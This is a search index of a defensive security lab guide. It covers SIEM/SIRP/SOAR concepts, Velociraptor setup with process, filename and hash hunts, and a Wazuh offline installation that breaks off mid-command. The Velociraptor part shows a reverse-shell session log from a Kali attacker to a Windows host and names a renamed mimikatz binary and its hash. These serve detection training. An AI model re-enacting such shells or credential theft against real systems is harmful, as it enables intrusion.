</ol>"},{"location":"understanding-SIEM/understanding-SIEM.html#siem-solutions","title":"SIEM Solutions","text":"<ul> <li>Splunk<ul> <li>Data Analytics Platform: excels at indexing, searching, and analysng large volumes of machine-generated data.</li> <li>Real-Time Monitoring: Provides live dashboards and visualizations for immediate insight.</li> <li>Extensibility: Supports a wide range of data inputs and third-party integrations.</li> </ul> </li> <li>Wazuh<ul> <li>Open-Source SIEM and XDR: SIEM and XDR (Extended Detection and Response) offers unified security monitoring and endpoint detection capabilities.</li> <li>Agent-Based Architecture: Deploys agents on endpoints for detailed data collection and active response.</li> <li>Compliance Management: Includes built-in checks for regulatory standards.</li> </ul> </li> </ul>"},{"location":"understanding-SIRP/understanding-SIRP.html","title":"Understanding SIRP","text":""},{"location":"understanding-SIRP/understanding-SIRP.html#understanding-sirp","title":"Understanding SIRP","text":""},{"location":"understanding-SIRP/understanding-SIRP.html#what-is-a-sirp","title":"What is a SIRP?","text":"<p>A Security Incident Response Platform is an integrated suite of tools designed to streamline and automate the process of managing cybersecurity incidents from detection to resolution.</p> <ul> <li>Incident Management: Facilitates the identification, containment, eradication, and recovery from security incidents.</li> <li>Case Management: Offers a structured framework for documenting, tracking, and managing incidents and investigations.</li> <li>Automation and Orchestration: Automates routine tasks and orchestrates workflows across different security tools.</li> </ul> <p>By consolidating these functionalities, a SIRP enhances the efficiency of incident response, improves team collaboration, and ensures that incidents are handled in a consistent and effective manner.</p>"},{"location":"understanding-SIRP/understanding-SIRP.html#why-sirp-matters-to-us","title":"Why SIRP Matters to Us","text":"<p>Efficient Incident Handling</p> <ul> <li>Systematic Approach: Provides a coordinated and methodical response to security incidents, reducing confusion and delays.</li> <li>Resource Optimisation: Helps prioritise incidents based on severity, ensuring that critical issues receive immediate attention.</li> </ul> <p>Enhanced Collaboration</p> <ul> <li>Team Coordination: Improves communication among IT, security teams, and other stakeholders involved in incident resolution.</li> <li>Centralised Information: Stores all incident-related data in one place, making it easier for teams to access and contribute relevant information.</li> </ul> <p>Regulatory Compliance</p> <ul> <li>Comprehensive Audit Trails: Maintains detailed records of incident handling, essential for compliance with cybersecurity regulations and standards.</li> <li>Policy Enforcement: Ensures that incident response procedures adhere to organisational policies and legal requirements.</li> </ul> <p>Risk Mitigation</p> <ul> <li>Minimising Impact: Enables swift and effective responses, reducing the potential damage from security incidents.</li> <li>Continuous Improvement: Analyses incidents to inform future security strategies and enhance incident response plans.</li> </ul> <p></p>"},{"location":"understanding-SIRP/understanding-SIRP.html#benefits-of-implementing-a-sirp","title":"Benefits of Implementing a SIRP","text":"<ul> <li>Improved Response Times: Automates repetitive tasks, allowing teams to focus on critical analysis and decision-making.</li> <li>Consistency: Standardises incident handling procedures across the organisation.</li> <li>Greater Visibility: Provides real-time insights into the status of incidents and the effectiveness of response efforts.</li> <li>Stakeholder Confidence: Demonstrates our commitment to robust security practices, enhancing trust with clients, partners, and regulators.</li> <li>Cost Efficiency: Reduces the financial impact of security incidents through quicker containment and recovery.</li> </ul>"},{"location":"understanding-SIRP/understanding-SIRP.html#how-a-sirp-works","title":"How a SIRP Works","text":"<ol> <li>Detection and Alerting: Integrates with security systems to receive alerts about potential security incidents.</li> <li>Incident Logging: Automatically creates a case for each incident, capturing all relevant details.</li> <li>Assessment and Prioritisation: Evaluates the severity and impact of the incident to prioritise response efforts.</li> <li>Response Coordination: Assigns tasks to team members, sets deadlines, and facilitates communication.</li> <li>Automation and Orchestration: Automates routine actions and coordinates workflows across various security tools.</li> <li>Documentation: Records all actions taken, decisions made, and evidence collected during the incident response.</li> <li>Resolution and Closure: Concludes the case once the incident is resolved, ensuring all loose ends are tied up.</li> <li>Reporting and Analysis: Generates reports for internal review and compliance purposes, and analyses incidents to improve future responses.</li> </ol>"},{"location":"understanding-SIRP/understanding-SIRP.html#sirp-solutions","title":"SIRP Solutions","text":"<p>TheHive</p> <ul> <li>Scalable Case Management: An open-source SIRP that enables efficient handling of multiple security incidents.</li> <li>Collaboration Features: Enhances teamwork through shared dashboards and real-time updates.</li> <li>Integration Capabilities: Easily connects with other security tools to provide a unified incident response ecosystem.</li> </ul> <p>IRIS</p> <ul> <li>Open-Source Platform: A robust SIRP designed for managing and automating incident response processes.</li> <li>Comprehensive Case Management: Offers modules for case tracking, evidence management, and detailed reporting.</li> <li>Customisable Workflows: Allows tailoring of incident response procedures to fit organisational needs.</li> </ul> <p></p>"},{"location":"understanding-SOAR/understanding-SOAR.html","title":"Understanding SOAR","text":""},{"location":"understanding-SOAR/understanding-SOAR.html#understanding-soar","title":"Understanding SOAR","text":""},{"location":"understanding-SOAR/understanding-SOAR.html#what-is-soar","title":"What is SOAR?","text":"<p>Security Orchestration, Automation, and Response (SOAR) is a set of technologies that enable organisations to collect security threat data and alerts from multiple sources. SOAR solutions allow for the automation of responses to low-level threats and the orchestration of complex processes involving multiple tools and teams.</p> <ul> <li>Security Orchestration: Integrates different security tools and systems to work together seamlessly.</li> <li>Automation: Automates routine and repetitive security tasks to improve efficiency.</li> <li>Response: Facilitates swift and effective responses to security incidents.</li> </ul>"},{"location":"understanding-SOAR/understanding-SOAR.html#why-soar-matters-to-us","title":"Why SOAR Matters to Us","text":"<ol> <li>Efficiency and Productivity<ul> <li>Reduced Manual Work: Automates repetitive tasks, freeing up our security team to focus on more critical issues.</li> <li>Faster Response Times: Automates incident responses to mitigate threats more quickly.</li> </ul> </li> <li>Enhanced Threat Management<ul> <li>Improved Detection: Correlates data from various sources for better threat detection.</li> <li>Comprehensive Response: Coordinates actions across different security tools for effective threat mitigation.</li> </ul> </li> <li>Scalability<ul> <li>Handling Alert Fatigue: Manages the growing number of security alerts without overburdening the team.</li> <li>Adaptability: Scales with our organisation's growth and evolving security needs.</li> </ul> </li> <li>Regulatory Compliance<ul> <li>Consistent Processes: Ensures compliance through standardized and documented response procedures.</li> <li>Audit Readiness: Maintains logs and reports necessary for audits and compliance checks.</li> </ul> </li> </ol>"},{"location":"understanding-SOAR/understanding-SOAR.html#benefits-of-implementing-soar","title":"Benefits of Implementing SOAR","text":"<ul> <li>Improved Security Posture: Enhances our ability to detect and respond to threats effectively.</li> <li>Operational Efficiency: Streamlines security operations through automation and integration.</li> <li>Cost Reduction: Lowers operational costs by reducing the need for manual intervention.</li> <li>Stakeholder Confidence: Demonstrates our commitment to robust cybersecurity practices.</li> </ul>"},{"location":"understanding-SOAR/understanding-SOAR.html#how-soar-works","title":"How SOAR Works","text":"<ol> <li>Data Collection: Aggregates security data from various sources such as firewalls, IDS/IPS, and endpoint protection systems.</li> <li>Analysis: Uses advanced analytics to identify and prioritize security threats.</li> <li>Automation: Executes predefined workflows to respond to specific types of threats automatically.</li> <li>Orchestration: Coordinates actions across multiple security tools and teams for a unified response.</li> <li>Reporting: Generates reports and dashboards for continuous monitoring and improvement.</li> </ol>"},{"location":"understanding-SOAR/understanding-SOAR.html#soar-solution","title":"SOAR Solution","text":"<ul> <li>Shuffle<ul> <li>Open-Source SOAR Platform: Provides a user-friendly interface for building and automating security workflows.</li> <li>Integration Capabilities: Easily connects with various security tools through built-in integrations.</li> <li>Custom Workflows: Allows us to create tailored automation workflows specific to our security needs.</li> </ul> </li> </ul>"},{"location":"velociraptor/velociraptor.html","title":"Velociraptor","text":""},{"location":"velociraptor/velociraptor.html#velociraptor","title":"Velociraptor","text":"<p>Velociraptor is an advanced digital forensic and incident response tool that enhances your visibility into your endpoints.</p>"},{"location":"velociraptor/velociraptor.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, the Velociraptor server was configured on an Ubuntu virtual machine (VM), and the Velociraptor client was configured on a Windows VM. An attack simulation was conducted on the Windows hosts using a Kali machine in a safe and controlled setting.</p> <p>Note: Do not attempt to replicate the attack emulation demonstrated here unless you are properly trained and it is safe to do so. Unauthorised attack emulation can lead to legal consequences and unintended damage to systems. Always ensure that such activities are conducted by qualified professionals in a secure, isolated environment.</p> Host OS Role IP Address Fortigate Fortios 7.6.0 Firewall/Router 192.168.1.111 (WAN) / 10.0.0.1 (LAN) WazuhServer Ubuntu 22.04 LTS Velociraptor Server 10.0.0.20 WS2019 Windows Server 2019 Velociraptor Client 10.0.0.40 Kali Kali Linux 2024.2 Attacker machine 10.0.0.22 <p></p>"},{"location":"velociraptor/velociraptor.html#deploy-velociraptor-server-linux","title":"Deploy Velociraptor Server (Linux)","text":"<p>The Velociraptor server will be set up to use self-signed SSL certificates and Basic authentication, which is a fairly straightforward configuration option.</p> <p>In\u00a0<code>self-signed SSL</code>\u00a0mode, Velociraptor issues its own server certificate using its internal CA. This means the Admin GUI and front end also use a self-signed server certificate.</p>"},{"location":"velociraptor/velociraptor.html#download-the-velociraptor-binaries","title":"Download the Velociraptor binaries","text":"<p>Download the latest Velociraptor binary that is compatible for your host architecture from https://github.com/Velocidex/velociraptor/releases.</p> <p>Before starting the setup, it\u2019s a good idea to create a fresh working directory to use for the pre-installation tasks.</p> <pre><code>mkdir ~/velociraptor_setup &amp;&amp; cd ~/velociraptor_setup\n</code></pre> <p>Copy the download link for the latest release that matches your server\u2019s platform and architecture, then use it in the <code>wget</code> command below. This will download the binary and save it as velociraptor.</p> <pre><code>wget -O velociraptor https://github.com/Velocidex/velociraptor/releases/download/v0.75/velociraptor-v0.75.6-linux-amd64\n</code></pre> <p>Next, make the downloaded file executable:</p> <pre><code>chmod +x velociraptor\n</code></pre>"},{"location":"velociraptor/velociraptor.html#create-the-server-configuration-file","title":"Create the server configuration file","text":"<p>To create a new configuration file, we use the <code>config generate</code> command. The <code>-i</code> flag runs the process in interactive mode, launching a question-and-answer style wizard that collects the key details needed to build your configuration.</p> <pre><code>./velociraptor config generate -i\n</code></pre> <p>In the configuration wizard, select the options outlined below. For any other prompts, just accept the default settings.</p> <p>Deployment Type: Self-signed SSL</p> <p>Public DNS name of the Master Frontend: Enter the server\u2019s IP address (or a DNS name, if you\u2019ve set one up) that clients will use to connect to the server.</p> <p>On the fourth screen of the configuration wizard, you\u2019ll be asked to create an admin user. Enter a username and password for the initial admin account, which will be used to access the web interface. You only need one admin at this stage, as additional users can be added later. After creating the first admin user, leave the next username and password blank to continue.</p> <p>In the last step of the configuration wizard, you\u2019ll be asked to save the config file to your working directory. You can stick with the default filename and the wizard will then close. Name of file to write: server.config.yaml</p> <p>By default, the configuration binds the GUI and Frontend services to the loopback address (127.0.0.1), meaning they\u2019re only accessible from the local machine. To allow access from other hosts on the network, you\u2019ll need to update the configuration file.</p> <p>Open the config file in a text editor and change:</p> <pre><code>Frontend:\n  bind_address: 127.0.0.1\n</code></pre> <p>to:</p> <pre><code>Frontend:\n  bind_address: 0.0.0.0\n</code></pre> <p>If you need to access the GUI from a different network host then also change:</p> <pre><code>GUI:\n  bind_address: 127.0.0.1\n</code></pre> <p>to:</p> <pre><code>GUI:\n  bind_address: 0.0.0.0\n</code></pre> <p>When using self-signed SSL, which only supports Basic authentication, you should avoid exposing the GUI to untrusted networks such as the public internet. If the server must be reachable from the internet, keep <code>GUI.bind_address</code> set to the loopback interface and access the GUI via SSH local port forwarding, which can be protected with stronger authentication.</p>"},{"location":"velociraptor/velociraptor.html#create-the-server-installation-package","title":"Create the server installation package","text":"<p>To create the server installation package, run the appropriate command below in your working directory.</p> <p>Debian-based server:</p> <pre><code>./velociraptor debian server --config ./server.config.yaml\n</code></pre> <pre><code>#Example Output\nvelouser@Velociraptor:~/velociraptor_setup$ ./velociraptor debian server --config ./server.config.yaml\n[\n {\n  \"OSPath\": \"/home/velouser/velociraptor_setup/velociraptor-server-0.75.6.amd64.deb\"\n }\n</code></pre> <p>RPM-based server:</p> <pre><code>./velociraptor rpm server --config ./server.config.yaml\n</code></pre> <p>The output file is automatically named to include the version and architecture, but you can use any filename you like by specifying it with the <code>--output &lt;your_file_name&gt;</code> option.</p>"},{"location":"velociraptor/velociraptor.html#install-the-server-component","title":"Install the server component","text":"<p>Install the server package using the command below according to your server\u2019s packaging system.</p> <p>Debian-based server installation:</p> <pre><code>sudo dpkg -i velociraptor-server-0.75.6.amd64.deb\n</code></pre> <pre><code>#Example Output\nvelouser@Velociraptor:~/velociraptor_setup$ sudo dpkg -i velociraptor-server-0.75.6.amd64.deb\nSelecting previously unselected package velociraptor-server.\n(Reading database ... 150772 files and directories currently installed.)\nPreparing to unpack velociraptor-server-0.75.6.amd64.deb ...\nUnpacking velociraptor-server (0.75.6) ...\nSetting up velociraptor-server (0.75.6) ...\ninfo: Selecting GID from range 100 to 999 ...\ninfo: Adding group `velociraptor' (GID 124) ...\ninfo: Selecting UID from range 100 to 999 ...\n\ninfo: Adding system user `velociraptor' (UID 122) ...\ninfo: Adding new user `velociraptor' (UID 122) with group `velociraptor' ...\ninfo: Not creating home directory `/etc/velociraptor'.\nCreated symlink /etc/systemd/system/multi-user.target.wants/velociraptor_server.service \u2192 /etc/systemd/system/velociraptor_server.service.\n</code></pre> <p>RPM-based server installation:</p> <pre><code>sudo rpm -Uvh velociraptor-server-0.75.6.x86_64.rpm\n</code></pre> <p>Now that the service is installed, there are a few ways you can check its status.</p> <p>Check the service status:</p> <pre><code>systemctl status velociraptor_server.service\n</code></pre> <pre><code>#Example Output\n\u25cf velociraptor_server.service - Velociraptor server\n     Loaded: loaded (/etc/systemd/system/velociraptor_server.service; enabled; preset: enabled)\n     Active: active (running) since Fri 2026-01-16 22:42:21 NZDT; 58s ago\n   Main PID: 4399 (velociraptor)\n      Tasks: 15 (limit: 4545)\n     Memory: 86.6M (peak: 88.0M)\n        CPU: 3.036s\n     CGroup: /system.slice/velociraptor_server.service\n             \u251c\u25004399 /usr/local/bin/velociraptor --config /etc/velociraptor/server.config.yaml frontend\n             \u2514\u25004407 /usr/local/bin/velociraptor --config /etc/velociraptor/server.config.yaml frontend\n\nJan 16 22:42:21 Velociraptor systemd[1]: Started velociraptor_server.service - Velociraptor server.\n</code></pre> <p>Check that the GUI is listening:</p> <pre><code>nc -vz 127.0.0.1 8889\n</code></pre> <pre><code>#Example Output\nvelouser@Velociraptor:~/velociraptor_setup$ nc -vz 127.0.0.1 8889\nConnection to 127.0.0.1 8889 port [tcp/*] succeeded!\n</code></pre> <p>Check that the Frontend is listening:</p> <pre><code>nc -vz 127.0.0.1 8000\n</code></pre> <pre><code>#Example Output\nvelouser@Velociraptor:~/velociraptor_setup$ nc -vz 127.0.0.1 8000\nConnection to 127.0.0.1 8000 port [tcp/*] succeeded!\n</code></pre>"},{"location":"velociraptor/velociraptor.html#log-in-to-the-admin-gui","title":"Log in to the Admin GUI","text":"<p>The Admin GUI should now be reachable in a web browser at <code>https://127.0.0.1:8889</code>, or via the server\u2019s IP address if you updated the <code>GUI.bind_address</code> setting earlier. Log in using the admin account you created during the configuration wizard, and you\u2019ll be taken to the Welcome screen.</p> <p></p> <p></p>"},{"location":"velociraptor/velociraptor.html#import-artifacts-from-external-projects","title":"Import artifacts from external projects","text":"<p>This step only applies if you are using version 0.75 or above. For older versions you can\u00a0skip to the next step\u00a0. Over time, Velociraptor has grown a number of separate sub-projects to handle larger and more complex artifacts. As these artifacts became more advanced, they were split out from the main project so they could be developed and maintained independently, allowing faster updates and innovation.</p> <p>While Velociraptor includes hundreds of built-in artifacts, it\u2019s recommended that you also use these external projects. Built-in artifacts usually focus on very specific tasks, whereas the larger projects are designed for broader investigations, such as wide-scale registry or indicator hunting.</p> Project Description Velociraptor Sigma Project Artifacts that implement Sigma-based triage and monitoring rules. Includes curated Sigma Rules (Hayabusa/Hayabusa Live/ChopChopGo) Velociraptor Triage Project This project intends to develop a set of rules that are used for specifying the collection of files from the endpoint. Rapid7Labs Artifacts developed and shared by\u00a0Rapid7 Labs\u00a0. Velociraptor Registry Hunter Project Velociraptor project to develop sophisticated registry analysis modules. Velociraptor SQLite Hunter Project This project aims to be a one-stop shop for\u00a0<code>SQLite</code>,\u00a0<code>ESE</code>\u00a0and many other database-oriented forensic artifacts. The Velociraptor Artifact Exchange Velociraptor repository of community-contributed artifacts. <p>From the Welcome screen, click Import Extra Artifacts. This will launch the artifact collection wizard for the server artifact <code>Server.Import.Extras</code>. Click Configure Parameters to move to that section of the wizard.</p> <p></p> <p>By default, <code>Server.Import.Extras</code> will import artifacts from all sub-projects. You don\u2019t have to import everything straight away though, as you can run this process again later to add or update specific artifacts. To remove an item, click the bin icon next to it. Once you\u2019re happy with your selection, click Launch to start the import.</p> <p></p> <p>Once the collection finishes, you can view the outcome in the Results tab. If the import fails for any reason, check the Log tab for more details.</p> <p></p>"},{"location":"velociraptor/velociraptor.html#deploying-velociraptor-clients-windows","title":"Deploying Velociraptor Clients (Windows)","text":""},{"location":"velociraptor/velociraptor.html#option-1-create-an-installation-package-for-windows-clients","title":"Option 1: Create an Installation Package for Windows clients","text":"<p>In the Velociraptor web GUI select\u00a0Server Artifacts\u00a0from the sidebar on the left side of the page.</p> <p></p> <p>Add a new collection (\u201d+\u201d icon). Search for\u00a0<code>Server.Utils.CreateMSI</code>, select it, and then click \u201cLaunch\u201d.</p> <p></p> <p>It may take a short while to download the latest MSI releases from GitHub (64-bit and, if selected, 32-bit) and repackage them with your client configuration. Once complete, the rebuilt MSI files will be available in the Uploaded Files tab of the collection.</p> <p></p> <p>Download the MSI files, then double-click the installer to install the client.</p> <p></p> <p>If prompted by Windows SmartScreen, click More info, then select Run anyway.</p> <p></p> <p>Navigate to <code>C:\\Program Files\\Velociraptor</code>. After a successful installation, you should see <code>velociraptor.writeback.yaml</code> in that directory.</p> <p></p>"},{"location":"velociraptor/velociraptor.html#option-2-download-official-release-msi","title":"Option 2: Download Official Release MSI","text":"<p>Download the latest Velociraptor MSI from the Velociraptor GitHub releases page. On your Windows host, double-click the MSI to install it.</p> <p>Once installed, navigate to <code>C:\\Program Files\\Velociraptor</code> and delete the existing default <code>client.config.yaml</code> file.</p> <p>The easiest way to obtain the correct client config file is to download it directly from the GUI. From the Home screen, go to Current Orgs and click the filename to download the YAML file.</p> <p></p> <p>Copy the downloaded <code>client.config.yaml</code> into <code>C:\\Program Files\\Velociraptor</code>.</p> <p>After this, you should see <code>velociraptor.writeback.yaml</code> appear in the same directory. If it doesn\u2019t appear, restart the computer.</p> <p></p>"},{"location":"velociraptor/velociraptor.html#verify-client-connection","title":"Verify Client Connection","text":"<p>On the Velociraptor Server web GUI, click on the magnifying glass icon and verify that your client is connected.</p> <p>Any client that has successfully enrolled will show a green light.</p> <p></p>"},{"location":"velociraptor/velociraptor.html#introduction-to-velociraptor","title":"Introduction to Velociraptor","text":""},{"location":"velociraptor/velociraptor.html#creating-a-process-hunt","title":"Creating a Process Hunt","text":"<p>A Windows reverse shell named <code>1.exe</code> was generated and executed on the Windows Server 2019 host, connecting to the Kali machine. The session was then switched from Command Prompt to PowerShell.</p> <pre><code>[*] Started reverse TCP handler on 10.0.0.22:4444 \n[*] Command shell session 1 opened (10.0.0.22:4444 -&gt; 10.0.0.40:49886) at 2024-09-18 19:56:51 -0400\n\nShell Banner:\nMicrosoft Windows [Version 10.0.17763.3650]\n-----       \n\nC:\\Users\\Administrator\\Downloads&gt;whoami\nwhoami\nws2019\\administrator\n\nC:\\Users\\Administrator\\Downloads&gt;powershell\npowershell\nWindows PowerShell \nCopyright (C) Microsoft Corporation. All rights reserved.\n</code></pre> <p>Create New Hunt by clicking Hunt icon and + icon</p> <p>In the Configure Hunt tab, add the description Process Hunt</p> <p></p> <p>In the Select Artifacts tab, search for pstree. Select <code>Generic.System.Pstree</code></p> <p>This artifact displays the call chain for every process on the system by traversing the process\u2019s parent ID.</p> <p></p> <p>In the same tab, search for pslist and select <code>Windows.System.Pslist</code></p> <p>This artifact list processes and their running binaries</p> <p></p> <p>In the Configure Parameters tab, Edit <code>Generic.system.Pstree</code></p> <p>Select IncludePstree</p> <p></p> <p>Select Review then Launch. Select the Hunt and click Play button to launch it.</p> <p></p> <p>Once the Hunt is complete (indicated by Total schedules and Finished clients), click the stop button to stop the Hunt.</p> <p>Check the results on the Notebook tab on web GUI.</p> <p>As shown in the screenshot below, the suspicious activity is detected. </p> <p></p> <p>Alternatively, if you prefer to Download Results as a CSV file and view it in an Excel, this can be done in the Results Section &gt; Download Results</p>"},{"location":"velociraptor/velociraptor.html#adding-client-labels","title":"Adding Client Labels","text":"<p>To create a label, click the magnifying glass icon, select the target host, then click the label icon. Name the new label (e.g., <code>windows</code>).</p> <p></p> <p>Verify that the label has been created.</p> <p></p>"},{"location":"velociraptor/velociraptor.html#creating-a-filename-search-hunt","title":"Creating a Filename Search Hunt","text":"<p>A malicious PowerShell script called <code>justascript.ps1</code> was created then removed on Windows client. </p> <p>Create a new hunt with the description <code>Filename search</code></p> <p>For Include Condition, select <code>Match by label</code></p> <p>For Include Labels, select <code>windows</code></p> <p></p> <p>On the Select Artifacts tab, type <code>filename</code> and select <code>Windows.Forensics.FilenameSearch</code></p> <p></p> <p>On the Configure Parameters tab, click spanner icon to configure.</p> <p>In the yaraRule, replace <code>my secret fie.txt</code> with <code>justascript.ps1</code> </p> <p></p> <p>Select Review then Launch. Run hunt by clicking the play icon. Once the hunt is finished, stop the hunt by clicking the stop icon. View results in the Notebook tab. Velociraptor detects that the script is in the Recycle bin. </p> <p></p>"},{"location":"velociraptor/velociraptor.html#creating-a-hash-hunt","title":"Creating a Hash Hunt","text":"<p>Mimikatz is a tool used to find and steal passwords from Windows computers. The <code>mimikatz.exe</code> was copied over to Windows client and have been renamed as <code>justanexe.exe</code>.</p> <p>Create a new hunt with the description <code>Hash Hunt</code></p> <p>For Include Condition, select <code>Match by label</code></p> <p>For Include Labels, select <code>windows</code></p> <p></p> <p>On the Select Artifacts tab, type <code>hash</code> and select <code>Generic.Detection.HashHunter</code></p> <p></p> <p>On the Configure Parameters tab, click spanner icon to configure.</p> <p>On SHA256List, copy and paste sha256 hash of mimikatz.exe <code>61c0810a23580cf492a6ba4f7654566108331e7a4134c968c2d6a05261b2d8a1</code></p> <p></p> <p>Select Launch. Run hunt by clicking the play icon. Once the hunt is finished, stop the hunt by clicking the stop icon. View results in the Notebook tab. Velociraptor matches the SHA256 hash with <code>justanexe.exe</code></p> <p></p>"},{"location":"velociraptor/velociraptor.html#references","title":"References","text":"<ul> <li>https://docs.velociraptor.app/</li> <li>https://www.youtube.com/watch?v=p9pQ2g-18o4&amp;t=590s</li> <li>https://youtu.be/-bj0c158Wlo?si=Gms_VnVyWe-LufOZ</li> <li>https://www.youtube.com/watch?v=S8POUZv7pT8</li> <li>https://www.youtube.com/watch?v=M7bMfdmWR7A</li> <li>https://github.com/Velocidex/velociraptor/releases/tag/v0.72</li> </ul>"},{"location":"wazuh/wazuh.html","title":"Wazuh","text":""},{"location":"wazuh/wazuh.html#wazuh","title":"Wazuh","text":"<p>Wazuh\u00a0is the open source security platform that unifies XDR and SIEM protection for endpoints and cloud workloads. It is designed to help organisations detect threats, monitor integrity, and ensure compliance across their infrastructure, including physical, virtual, containerised, and cloud environments.</p>"},{"location":"wazuh/wazuh.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, attack emulation was conducted on the FortiGate VM, Windows and Ubuntu hosts in a safe and controlled setting. </p> <p>Note: Do not attempt to replicate the attack emulation demonstrated here unless you are properly trained and it is safe to do so. Unauthorised attack emulation can lead to legal consequences and unintended damage to systems. Always ensure that such activities are conducted by qualified professionals in a secure, isolated environment.</p> Host OS Role IP Address Fortigate Fortios 7.6.0 Firewall/Router 192.168.1.111 (WAN) / 10.0.0.1 (LAN) WazuhServer Centos Stream 9 Wazuh server 10.0.0.20 WS2019 Windows Server 2019 Wazuh agent 10.0.0.24 SyslogUbuntu Ubuntu 22.04 LTS Wazuh agent, rsyslog server 10.0.0.26 Kali Kali Linux 2024.2 Attacker machine 192.168.1.161, 10.0.0.29 <p></p>"},{"location":"wazuh/wazuh.html#install-wazuh-server-offline","title":"Install Wazuh Server offline","text":"<p>To install Wazuh offline, first download its core components for later installation on a system without Internet access. You can set up the Wazuh server, indexer, and dashboard on a single host (all-in-one deployment) or install them separately across multiple hosts (distributed deployment), depending on your requirements. See the Wazuh Server requirements for details.</p> <p>Note: Root user privileges are required to run the following commands.</p>"},{"location":"wazuh/wazuh.html#prerequisites","title":"Prerequisites","text":"<p>Ensure that <code>curl</code>, <code>tar</code>, and <code>setcap</code> are installed on the target system for the offline installation. On some Debian-based systems, <code>gnupg</code> may also be required.</p> <p>Additionally, some systems have <code>cp</code> set as an alias for <code>cp -i</code>, which prompts for confirmation before overwriting files. To prevent this, run <code>unalias cp</code>.</p>"},{"location":"wazuh/wazuh.html#configuring-firewall-optional","title":"Configuring Firewall (Optional)","text":"<p>Configure Firewall rule to allow access on required ports</p> <p>CentOS:</p> <pre><code>firewall-cmd --zone=public --add-port=9200/tcp --permanent #Wazuh-indexer\nfirewall-cmd --zone=public --add-port=55000/tcp --permanent #enrollment service\nfirewall-cmd --zone=public --add-port=1514/tcp --permanent #agent communication\nfirewall-cmd --zone=public --add-port=1515/tcp --permanent #enrollment service\n\n#Apply changes\nfirewall-cmd --reload\n\n#Check applied\nfirewall-cmd --list-all\n</code></pre> <p>Ubuntu:</p> <pre><code>ufw allow 9200/tcp\nufw allow 55000/tcp\nufw allow 1514/tcp\nufw allow 1515/tcp\n</code></pre>"},{"location":"wazuh/wazuh.html#downloading-the-packages-and-configuration-files","title":"Downloading the Packages and Configuration Files","text":"<p>From any Linux system with Internet access, run the following commands to execute a script that downloads all necessary files for offline installation on x86_64 architectures. Choose the appropriate package format to download.</p> <p>RPM:</p> <pre><code>curl -sO https://packages.wazuh.com/4.14/wazuh-install.sh\nchmod 744 wazuh-install.sh\n./wazuh-install.sh -dw rpm\n</code></pre> <p>DEB:</p> <pre><code>curl -sO https://packages.wazuh.com/4.14/wazuh-install.sh\nchmod 744 wazuh-install.sh\n./wazuh-install.sh -dw deb\n</code></pre> <p>Download the certificates configuration file.</p> <pre><code>curl -sO https://packages.wazuh.com/4.14/config.yml\n</code></pre> <p>Modify <code>config.yml</code> to set up certificate creation.</p> <ul> <li>For an all-in-one deployment, replace <code>\"&lt;indexer-node-ip&gt;\"</code>, <code>\"&lt;wazuh-manager-ip&gt;\"</code>, and <code>\"&lt;dashboard-node-ip&gt;\"</code> with <code>127.0.0.1</code>.</li> <li>For a distributed deployment, update the node names and IP addresses with the correct values for the Wazuh server, indexer, and dashboard. Add extra node fields as required.</li> </ul> <pre><code>nodes:\n  # Wazuh indexer nodes\n  indexer:\n    - name: node-1\n      ip: 10.0.0.20\n    #- name: node-2\n    #  ip: \"&lt;indexer-node-ip&gt;\"\n    #- name: node-3\n    #  ip: \"&lt;indexer-node-ip&gt;\"\n\n  # Wazuh server nodes\n  # If there is more than one Wazuh server\n  # node, each one must have a node_type\n  server:\n    - name: wazuh-1\n      ip: 10.0.0.20\n    #  node_type: master\n    #- name: wazuh-2\n    #  ip: \"&lt;wazuh-manager-ip&gt;\"\n    #  node_type: worker\n    #- name: wazuh-3\n    #  ip: \"&lt;wazuh-manager-ip&gt;\"\n    #  node_type: worker\n\n  # Wazuh dashboard nodes\n  dashboard:\n    - name: dashboard\n      ip: 10.0.0.20\n</code></pre> <p>Run the <code>./wazuh-install.sh -g</code> to generate the certificates. For a multi-node cluster, these certificates need to be later deployed to all Wazuh instances in your cluster.</p> <pre><code>./wazuh-install.sh -g\n</code></pre> <p>Transfer the following files to a directory on the host(s) where the offline installation will be performed. You can use <code>scp</code> for this:</p> <ul> <li><code>wazuh-install.sh</code></li> <li><code>wazuh-offline.tar.gz</code></li> <li><code>wazuh-install-files.tar</code></li> </ul>"},{"location":"wazuh/wazuh.html#installing-wazuh-components","title":"Installing Wazuh Components","text":"<p>In the working directory where you placed\u00a0<code>wazuh-offline.tar.gz</code>\u00a0and\u00a0<code>wazuh-install-files.tar</code>, execute the following command to decompress the installation files:</p> <pre><code>tar xf wazuh-offline.tar.gz\ntar xf wazuh-install-files.tar\n</code></pre>"},{"location":"wazuh/wazuh.html#installing-the-wazuh-indexer","title":"Installing the Wazuh Indexer","text":"<p>RPM:</p> <p>The following dependencies must be installed on the Wazuh indexer nodes.</p> <ul> <li>coreutils</li> </ul> <pre><code>rpm --import ./wazuh-offline/wazuh-files/GPG-KEY-WAZUH\nrpm -ivh ./wazuh-offline/wazuh-packages/wazuh-indexer*.rpm\n</code></pre> <p>DEB:</p> <p>The following dependencies must be installed on the Wazuh indexer nodes.</p> <ul> <li>debconf</li> <li>adduser</li> <li>procps</li> </ul> <pre><code>dpkg -i ./wazuh-offline/wazuh-packages/wazuh-indexer*.deb\n</code></pre> <p>Run the following commands replacing\u00a0<code>&lt;indexer-node-name&gt;</code>\u00a0with the name of the Wazuh indexer node you are configuring as defined in\u00a0<code>config.yml</code>. For example,\u00a0<code>node-1</code>. This deploys the SSL certificates to encrypt communications between the Wazuh central components.</p> <p>On CentOS, if you encounter the error:</p> <pre><code>chmod: cannot access '/etc/wazuh-indexer/certs/*': No such file or directorty\n</code></pre> <p>Navigate to <code>/etc/wazuh-indexer/certs/</code> and run <code>chmod 400 *</code> as the root user.</p> <pre><code>NODE_NAME=&lt;INDEXER_NODE_NAME&gt;\n</code></pre> <pre><code>mkdir /etc/wazuh-indexer/certs\nmv -n wazuh-install-files/$NODE_NAME.pem /etc/wazuh-indexer/certs/indexer.pem\nmv -n wazuh-install-files/$NODE_NAME-key.pem /etc/wazuh-indexer/certs/indexer-key.pem\nmv wazuh-install-files/admin-key.pem /etc/wazuh-indexer/certs/\nmv wazuh-install-files/admin.pem /etc/wazuh-indexer/certs/\ncp wazuh-install-files/root-ca.pem /etc/wazuh-indexer/certs/\nchmod 500 /etc/wazuh-indexer/certs\nchmod 400 /etc/wazuh-indexer/certs/*\nchown -R wazuh-indexer:wazuh-indexer 